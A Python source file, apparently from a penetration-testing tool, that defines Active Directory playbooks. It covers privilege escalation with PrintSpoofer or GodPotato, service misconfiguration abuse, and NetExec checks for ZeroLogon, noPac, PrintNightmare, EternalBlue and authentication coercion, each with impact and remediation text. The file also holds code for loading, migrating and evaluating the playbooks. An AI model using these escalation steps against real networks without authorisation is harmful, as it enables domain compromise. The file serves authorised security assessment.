                  "AlwaysInstallElevated, autologon creds, unquoted paths, scheduled tasks."),
            _step(2, "Abuse SeImpersonatePrivilege → SYSTEM", "have credential",
                  "PrintSpoofer / GodPotato (on the host)", ["credential"], ["admin"],
                  "Service accounts (IIS/MSSQL) usually hold SeImpersonatePrivilege — "
                  "PrintSpoofer64.exe -i -c cmd (or GodPotato) impersonates SYSTEM. This is the "
                  "MSSQL foothold → SYSTEM step. (Documented: needs a shell on the host.)"),
            _step(3, "Service / path misconfigurations", "have credential",
                  "sc / accesschk (on the host)", ["credential"], ["admin"],
                  "Weak service ACLs (reconfigure binPath), unquoted service paths, or writable "
                  "%PATH% dirs → run a payload as the service (often SYSTEM).", "final"),
        ],
    },

    {
        "id": "ad-cve-check",
        "name": "Critical AD CVE checks (ZeroLogon / noPac / PrintNightmare / …)",
        "summary": "Safely CHECK a DC/host for the well-known critical AD vulnerabilities "
                   "that grant Domain Admin or SYSTEM in one shot. Non-destructive checks "
                   "via NetExec modules — a finding fires only for what is actually vulnerable.",
        "match": {"any_ports": [445], "signals": []},
        "run": {},
        "steps": [
            _step(1, "ZeroLogon (CVE-2020-1472)", "start", "netexec_module",
                  [], ["zerologon_vuln"],
                  "nxc smb -M zerologon: check the Netlogon flaw that resets the DC "
                  "machine password → instant Domain Admin. (Check only, non-destructive.)",
                  args={"protocol": "smb", "module": "zerologon"},
                  severity="Critical", cvss="10.0",
                  finding_title="ZeroLogon — Domain Controller Vulnerable (CVE-2020-1472)",
                  impact="An unauthenticated attacker can reset the DC machine account "
                         "password and immediately obtain Domain Admin / DCSync.",
                  recommendation="Apply the August 2020+ patches and enforce Netlogon "
                         "secure-channel enforcement mode."),
            _step(2, "noPac (CVE-2021-42278/42287)", "have credential", "netexec_module",
                  ["credential"], ["nopac_vuln"],
                  "nxc smb -M nopac: sAMAccountName spoofing lets a standard user impersonate "
                  "a DC and reach Domain Admin.",
                  args={"protocol": "smb", "module": "nopac"},
                  severity="Critical", cvss="9.0",
                  finding_title="noPac / sAMAccountName Spoofing (CVE-2021-42278/42287)",
                  impact="Any authenticated user can escalate to Domain Admin by spoofing "
                         "a domain controller's account name.",
                  recommendation="Apply the November 2021 patches; set ms-DS-Machine-"
                         "AccountQuota to 0 as defence in depth."),
            _step(3, "PrintNightmare (CVE-2021-34527)", "have credential", "netexec_module",
                  ["credential"], ["printnightmare_vuln"],
                  "nxc smb -M printnightmare: Print Spooler RCE → SYSTEM on the host.",
                  args={"protocol": "smb", "module": "printnightmare"},
                  severity="High", cvss="8.8",
                  finding_title="PrintNightmare — Print Spooler RCE (CVE-2021-34527)",
                  impact="The Print Spooler allows remote code execution as SYSTEM; on a DC "
                         "this is domain compromise.",
                  recommendation="Patch and disable the Print Spooler service on servers/DCs "
                         "that don't need it; restrict Point-and-Print."),
            _step(4, "MS17-010 EternalBlue", "start", "netexec_module",
                  [], ["ms17_vuln"],
                  "nxc smb -M ms17-010: legacy SMBv1 RCE → SYSTEM.",
                  args={"protocol": "smb", "module": "ms17-010"},
                  severity="Critical", cvss="9.3",
                  finding_title="MS17-010 EternalBlue — SMBv1 RCE",
                  impact="Unauthenticated remote code execution as SYSTEM over SMBv1.",
                  recommendation="Patch MS17-010 and disable SMBv1 entirely."),
            _step(5, "Authentication coercion (PetitPotam / PrinterBug / DFSCoerce)", "start",
                  "netexec_module", [], ["coerced"],
                  "nxc smb -M coerce_plus: check whether the host can be coerced to "
                  "authenticate (feeds NTLM relay to an unsigned host or ADCS ESC8).",
                  "final", args={"protocol": "smb", "module": "coerce_plus"},
                  severity="High", cvss="8.1",
                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
                  impact="A DC/host can be coerced into authenticating to an arbitrary "
                         "target, feeding an NTLM relay to any unsigned host or ADCS ESC8.",
                  recommendation="Patch MS-RPRN/MS-EFSR/MS-DFSNM, disable the Print Spooler "
                         "on DCs, enforce SMB signing and channel binding, and disable NTLM."),
        ],
    },

    # ---- finding playbooks (detection + report content) ------------------
    _finding("smb-signing", "SMB Signing Not Enforced", "High", "6.5",
             "One or more hosts do not require SMB signing. Unsigned SMB allows "
             "an attacker who can capture or coerce NTLM authentication to relay "
             "it to these hosts.",
             "NTLM/SMB relay to the host can yield command execution or a "
             "credential/SAM dump, enabling lateral movement.",
             "Enforce SMB signing (Require) via GPO on all servers and "
             "workstations; disable NTLM where possible.",
             any_ports=[445], host_facts={"smb_signing": "False"},
             evidence_tools=["netexec_smb"]),
    _finding("smb-nullauth", "SMB Null / Anonymous Authentication Permitted",
             "Medium", "5.3",
             "The host accepts an anonymous (null) SMB session. The evidence "
             "shows what an unauthenticated attacker can enumerate over that "
             "session (e.g. shares) — confirming real, not just theoretical, exposure.",
             "Anonymous users can enumerate shares, and depending on configuration "
             "also users (RID cycling) and password policy — valuable recon and a "
             "starting point for further access.",
             "Restrict anonymous access (RestrictNullSessAccess=1, "
             "RestrictAnonymous=1); review share and RID enumeration exposure.",
             any_ports=[445], host_facts={"smb_nullauth": "True"},
             evidence_tools=["smbclient_shares", "netexec_smb"]),
    _finding("wsus-http", "WSUS Served Over HTTP", "High", "8.1",
             "A WSUS update service is reachable over cleartext HTTP (8530).",
             "If clients are not forced to use WSUS over SSL, an on-path attacker "
             "can spoof updates and execute code as SYSTEM on managed endpoints.",
             "Require WSUS over HTTPS (8531) and set the 'Do not store passwords'/"
             "SSL enforcement GPO for clients.",
             any_ports=[8530]),
    _finding("admin-console", "Administration Console Exposed", "Low", "4.0",
             "A management console / agent handler (e.g. endpoint-management "
             "platform) is network-reachable.",
             "If protected only by default or weak credentials, console access can "
             "push tasks/software to every managed endpoint.",
             "Restrict the console to management networks, enforce strong unique "
             "admin credentials and MFA, and patch to current.",
             any_ports=[8443, 8444]),
    _finding("rdp-exposed", "Remote Desktop (RDP) Exposed", "Low", "4.0",
             "RDP (3389) is reachable on the network.",
             "Credential brute-force / password-spray surface; legacy hosts may be "
             "vulnerable to pre-auth RCE (e.g. BlueKeep).",
             "Restrict RDP to jump hosts/VPN, require NLA, enforce account lockout, "
             "and keep hosts patched.",
             any_ports=[3389]),
    _finding("http-headers", "Missing HTTP Security Headers", "Low", "3.1",
             "Web responses omit recommended security headers (e.g. "
             "Content-Security-Policy, X-Frame-Options, HSTS).",
             "Increases exposure to clickjacking, MIME sniffing, and transport "
             "downgrade attacks.",
             "Add CSP, X-Frame-Options/frame-ancestors, X-Content-Type-Options, "
             "and Strict-Transport-Security.",
             any_ports=[80, 8080, 8000], evidence_tools=["http_probe"],
             detector="missing_http_headers"),
]


def _path(log_dir) -> Path:
    return Path(log_dir) / "playbooks.json"


def load(log_dir) -> list:
    """Return the stored playbooks, seeding the defaults on first use."""
    p = _path(log_dir)
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        if isinstance(data, list) and data:
            return _migrate(log_dir, data)
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    save(log_dir, copy.deepcopy(DEFAULT_PLAYBOOKS))
    return copy.deepcopy(DEFAULT_PLAYBOOKS)


def _migrate(log_dir, data: list) -> list:
    """Upgrade older stored playbooks in place.

    Built-in playbooks evolve (the AD chain became a tool-per-step model; steps
    gained args, finding fields, and accurate consumes/produces). Each built-in is
    stamped with ``_v``; when the stored copy predates the current
    ``_BUILTIN_VERSION`` (or is the old AD-chain shape) it is re-seeded from the
    default. User-created playbooks are never re-seeded — only back-filled with any
    missing step keys so the editor can show them.
    """
    changed = False
    defaults = {pb["id"]: pb for pb in DEFAULT_PLAYBOOKS}
    for i, pb in enumerate(data):
        dpb = defaults.get(pb.get("id"))
        if dpb is not None:
            run = pb.get("run") or {}
            old_shape = bool(run.get("sequence")) or any(
                not _runnable_tool(s.get("tool", "")) for s in pb.get("steps", []))
            if pb.get("_v") != _BUILTIN_VERSION or old_shape:
                data[i] = copy.deepcopy(dpb)
                data[i]["_v"] = _BUILTIN_VERSION
                changed = True
                continue
        for st in pb.get("steps", []):        # user-created / already-current
            if "args" not in st:
                st["args"] = {}
                changed = True
            for k in ("severity", "cvss", "impact", "recommendation", "finding_title"):
                if k not in st:
                    st[k] = ""
                    changed = True
    # Add any built-in playbook that isn't stored yet (new defaults on upgrade),
    # preserving the operator's existing order and customisations.
    have = {pb.get("id") for pb in data}
    for dpb in DEFAULT_PLAYBOOKS:
        if dpb["id"] not in have:
            new = copy.deepcopy(dpb)
            new["_v"] = _BUILTIN_VERSION
            data.append(new)
            changed = True
    if changed:
        save(log_dir, data)
    return data


def save(log_dir, playbooks: list) -> None:
    p = _path(log_dir)
    p.parent.mkdir(parents=True, exist_ok=True)
    tmp = p.with_suffix(".tmp")
    tmp.write_text(json.dumps(playbooks, indent=2), encoding="utf-8")
    tmp.replace(p)


def reset(log_dir) -> list:
    save(log_dir, copy.deepcopy(DEFAULT_PLAYBOOKS))
    return copy.deepcopy(DEFAULT_PLAYBOOKS)


def _open_ports(services: list) -> dict:
    """port -> [hosts] from the service matrix (each service row has ports+hosts)."""
    ports: dict[int, list] = {}
    for s in services:
        hosts = [h["host"] for h in s.get("hosts", [])]
        for p in s.get("ports", []):
            ports.setdefault(int(p), [])
            for h in hosts:
                if h not in ports[int(p)]:
                    ports[int(p)].append(h)
    return ports


def _host_open_ports(entry: dict) -> set:
    return {p["port"] for p in entry.get("ports", {}).values()
            if p.get("state") == "open"}


def matching_hosts(pb: dict, hosts: dict) -> list:
    """Hosts a playbook applies to: those exposing one of its ports AND whose
    facts equal every required host_fact (that's what makes a finding per-host)."""
    match = pb.get("match", {}) or {}
    any_ports = set(int(p) for p in (match.get("any_ports") or []))
    host_facts = match.get("host_facts") or {}
    out = []
    for h, entry in sorted((hosts or {}).items()):
        ports = _host_open_ports(entry)
        if any_ports and not (any_ports & ports):
            continue
        hf = entry.get("facts", {})
        if any(str(hf.get(k)) != str(v) for k, v in host_facts.items()):
            continue
        out.append(h)
    return out


def evaluate(pb: dict, hosts: dict, services: list, facts: dict) -> dict:
    """Explain whether *pb* matches the current scan results.

    Returns {matched, matched_hosts, reasons:[{rule,matched,hits}]}. A playbook
    matches when a required port is open (and, for finding playbooks, the required
    host facts hold on that host). Signals add context.
    """
    ports = _open_ports(services)
    reasons = []
    match = pb.get("match", {}) or {}
    host_facts = match.get("host_facts") or {}

    any_ports = match.get("any_ports") or []
    port_matched = None
    if any_ports:
        hits = [f"{h}:{p}" for p in any_ports for h in ports.get(int(p), [])]
        port_matched = bool(hits)
        reasons.append({"rule": f"any open port in {any_ports}",
                        "matched": port_matched, "hits": sorted(hits)})

    matched_hosts = matching_hosts(pb, hosts)
    for k, v in host_facts.items():
        hits = [h for h in matched_hosts]
        reasons.append({"rule": f"host fact {k} = {v}",
                        "matched": bool(matched_hosts), "hits": hits})

    for sig in match.get("signals") or []:
        present = bool(facts.get(sig)) or (sig == "username" and (
            facts.get("username") or facts.get("nthash")))
        reasons.append({"rule": f"fact signal '{sig}'",
                        "matched": bool(present),
                        "hits": [f"{sig}={facts.get(sig)}"] if facts.get(sig) else []})

    if host_facts:
        matched = bool(matched_hosts)
    elif port_matched is not None:
        matched = port_matched
    else:
        matched = True
    return {"matched": matched, "matched_hosts": matched_hosts, "reasons": reasons}


def annotate(hosts: dict, services: list, facts: dict, log_dir) -> list:
    out = []
    for pb in load(log_dir):
        out.append({**pb, "evaluation": evaluate(pb, hosts, services, facts)})
    return out
